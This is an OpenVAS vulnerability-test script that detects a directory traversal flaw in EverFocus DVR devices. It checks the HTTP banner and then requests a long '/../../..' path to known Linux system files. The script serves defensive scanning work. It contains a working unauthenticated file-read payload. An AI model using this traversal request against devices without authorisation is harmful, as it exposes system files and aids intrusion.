###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_everfocus_multiple_devices_lfi_03_2013.nasl 11960 2018-10-18 10:48:11Z jschulte $
#
# EverFocus Multiple Devices Directory Traversal
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103682");
  script_version("$Revision: 11960 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_name("EverFocus Multiple Devices Directory Traversal");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120827/DDIVRT-2013-50.txt");
  script_xref(name:"URL", value:"http://www.everfocus.com/firmware_upgrade.cfm");

  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:48:11 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-03-20 10:34:19 +0100 (Wed, 20 Mar 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("EverFocus/banner");
  script_tag(name:"solution", value:"Firmware update is available from EverFocus technical support.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Multiple EverFocus devices allowing unauthenticated remote users to retrieve arbitrary
  system files that are located outside of the web root through a directory traversal on
  port 80.");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || banner !~ 'realm="(EPARA|EPHD|ECOR)[^"]+"')exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/../../../../../../../../../../../../../../../' + file;

  if(http_vuln_check(port:port, url:url,pattern:pattern)) {
    report = report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
   exit(0);
  }
}

exit(99);
